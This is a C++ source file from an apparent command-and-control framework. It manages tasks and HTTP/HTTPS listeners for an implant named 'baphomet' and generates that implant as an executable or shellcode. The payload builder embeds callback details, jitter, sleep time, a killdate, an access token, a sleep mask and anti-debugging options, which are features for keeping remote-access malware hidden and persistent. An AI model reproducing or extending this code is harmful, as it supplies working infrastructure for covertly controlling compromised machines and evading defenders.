//
// Created by diago on 2024-06-06.
//

#include <baphomet.hpp>
#include <components.hpp>


lurch::result<std::string>
lurch::baphomet::print_tasks() const {

    //
    // std::queue does not have iterators.
    // we need to create a copy and pop each element one by one.
    //

    std::queue copy_queue(tasks);
    std::string buff;

    while(!copy_queue.empty()) {
        buff += copy_queue.front() + '\n';
        copy_queue.pop();
    }

    if(buff.empty()) {
        return error("no tasks available.");
    }

    buff.pop_back();
    return { buff };
}


lurch::result<std::string>
lurch::baphomet::print_staged_files() const {

    if(const auto file_list = inst->db.fileman_get_file_list(id)) {
        std::string result;
        for(const auto& path : *file_list) {
            result += path.string() + '\n';
        }

        result.pop_back(); //remove trailing \n char
        return { result };
    }
    else {
        return file_list.error();
    }
}


lurch::result<std::string>
lurch::baphomet::clear_tasks() {
    if(tasks.empty()) {
        return error("no tasks exist");
    }

    while(!tasks.empty())
        tasks.pop();

    return { "cleared tasks." };
}


lurch::result<std::string>
lurch::baphomet::print_listeners() const {

    if(const auto listeners = inst->db.query_listeners_by_object(id)) {

        std::string buff;
        buff += io::format_str("{:<17} {:<7} {:<7}", "Address", "Port", "Proto") + '\n';
        buff += io::format_str("{:=<17} {:=<7} {:=<7}", "=", "=", "=") + '\n';

        //
        // Technically there should only be one listener per agent, but I'll leave
        // this as a loop in case that changes.
        //

        for(const auto &[address, guid, port, type, cert, key] : *listeners) {
            buff += io::format_str(
                "{:<17} {:<7} {:<7}",
                address,
                port,
                listener_type_to_str(type)
            ) + '\n';
        }

        return { buff };
    }
    else {
        return error(listeners.error());
    }
}


lurch::result<std::string>
lurch::baphomet::start_listener(reciever_context &ctx) const {

    const auto [type, address, port] =
        ctx.cmd.get<std::string>("--type", "-t")
            .with<std::string>("--address", "-a")
            .with<int64_t>("--port", "-p")
            .done();

    //
    // Check if there is already a listener first
    //

    if(const auto existing_listener = inst->db.query_listeners_by_object(id)) {
        return error("A listener already exists");
    }


    if(*type == "http") {

        return inst->routing.start_listener_http(*address, *port, id, std::nullopt, std::nullopt)
            .and_then([&](bool _) {
                return inst->db.store_listener(*address, *port, id, std::nullopt, std::nullopt, listener_type::HTTP);
            })
            .and_then([&](bool _) {
                return result<std::string>(io::format_str("Successfully created HTTP listener on {}:{}", *address, *port));
            })
            .or_else([&](std::string err) {
                return result<std::string>(error(err));
            });
    }


    if(*type == "https") {

        auto cert_file = inst->db.fileman_get_by_extension(id, ".crt");
        auto key_file  = inst->db.fileman_get_by_extension(id, ".key");

        if(!cert_file || !key_file) {

            if(!std::filesystem::exists("static/fileman/" + id)) {
                std::filesystem::create_directory("static/fileman/" + id);
            }

            if(!inst->generate_self_signed_cert(
                io::format_str("static/fileman/{}/{}", id, "cert.crt"),
                io::format_str("static/fileman/{}/{}", id, "keyfile.key"),
                X509_VERSION_3
            )) {
                return error("Failed to generate self-signed certificate.");
            }

            cert_file = io::format_str("static/fileman/{}/{}", id, "cert.crt");
            key_file  = io::format_str("static/fileman/{}/{}", id, "keyfile.key");
        }


        return inst->routing.start_listener_http(*address, *port, id, cert_file->string(), key_file->string())
            .and_then([&](bool _) {
                return inst->db.store_listener(*address, *port, id, cert_file->string(), key_file->string(), listener_type::HTTPS);
            })
            .and_then([&](bool _) {
                return result<std::string>(io::format_str("Successfully created HTTPS listener on {}:{}", *address, *port));
            })
            .or_else([&](std::string err) {
                return result<std::string>(error(err));
            });
    }

    return error("Invalid listener type.");
}


lurch::result<std::string>
lurch::baphomet::stop_listener(reciever_context &ctx) const {

    if(const auto delete_res = inst->db.delete_listeners(id)) {

        std::thread t(std::bind(&instance::router::free_listeners, &inst->routing, this->id)); //prevent deadlock.
        t.detach();

        return "Successfully stopped listener.";
    } else {
        return delete_res.error();
    }
}


lurch::result<std::string>
lurch::baphomet::generate_payload(reciever_context &ctx) const {

    const auto [format, use_listener, user_agent, sleeptime, jitter, killdate, mask, debug_prevention] =
        ctx.cmd.get<std::string>("--format", "-f")
            .with<empty>("--use-listener", "-l")
            .with<std::string>("--user-agent", "-ua")
            .with<int64_t>("--sleeptime", "-s")
            .with<int64_t>("--jitter", "-j")
            .with<int64_t>("--killdate", "-kd")
            .with<empty>("--use-sleepmask", "-m")
            .with<empty>("--prevent-debugging", "-pd")
            .done();


    std::string       file_path;
    std::string       extension;
    baphomet_metadata metadata;


    if(*format == "exe") {
        file_path = "payloads/baphomet.exe";
        extension = "exe";
    } else if(*format == "shellcode") {
        file_path = "payloads/baphomet.dll";
        extension = "bin";
    } else {
        return error("Unrecognized payload type.");
    }

    if(!std::filesystem::exists(file_path)) {
        return error("Payload not found.");
    }

    auto file_contents = inst->db.fileman_get_raw(file_path);
    if(!file_contents) {
        return file_contents.error();
    }


    //
    // Validate parameters
    //

    if(sleeptime && *sleeptime < 1500) {
        return error("Invalid sleep time. Must be at least 1.5 seconds (1500ms).");
    } if(jitter && (*jitter < 0 || jitter > 10)) {
        return error("Invalid jitter value. Must be between 0 and 10, inclusive.");
    } if(killdate && (*killdate < 0 || *killdate > 8765)) {
        return error("Killdate must be in hours, and less than 1 year.");
    } if(user_agent && user_agent->empty()) {
        return error("Empty user/agent value.");
    } if(user_agent && user_agent->find_first_of('!') != std::string::npos) {
        return error("user/agent must not contain this character: " + '!');
    }


    //
    // Network metadata
    //

    if(use_listener) {
        if(const auto curr_listener = inst->db.query_listeners_by_object(id)) {
            metadata.addr  = (*curr_listener)[0].address;
            metadata.port  = (*curr_listener)[0].port;
            metadata.proto = (*curr_listener)[0].type;
        } else {
            return error("Listener was specified but one hasn't been created.");
        }
    }

    else { //default
        metadata.addr  = inst->routing.network_data.address;
        metadata.port  = inst->routing.network_data.port;
        metadata.proto = inst->routing.network_data.secure ? listener_type::HTTPS : listener_type::HTTP;
    }


    //
    // Other metadata
    //

    metadata.callback_object   = id;
    metadata.jitter            = jitter.value_or(0);
    metadata.sleep_time        = sleeptime.value_or(2000);
    metadata.use_sleepmask     = mask.has_value();
    metadata.prevent_debugging = debug_prevention.has_value();
    metadata.user_agent        = user_agent.value_or("Baphomet/1.0");
    metadata.token             = inst->db.generate_token();


    return inst->db.store_token(metadata.token, access_level::LOW, "Baphomet", killdate.value_or(12))
        .and_then([&](bool _) {
            return add_payload_metadata(*file_contents, metadata);
        })
        .and_then([&](bool _) {
            if(*format == "shellcode") {
                return concatenate_payload_stub(*file_contents);
            }
            return result<bool>(true);
        })
        .and_then([&](bool _) {
            return inst->db.fileman_create({file_contents->data(), file_contents->size()}, extension, id, true);
        })
        .and_then([&](std::filesystem::path pth) {

            inst->log.write(
                io::format_str("Generated baphomet payload. Format: {}, Filepath: {}", *format, pth.string()),
                log_type::SUCCESS,
                log_noise::REGULAR
            );

            return result<std::string>(templates::terminal_media(pth.string(), pth.filename().string(), '.' + extension));
        })
        .or_else([&](std::string err) {
            return result<std::string>(error(err));
        });
}

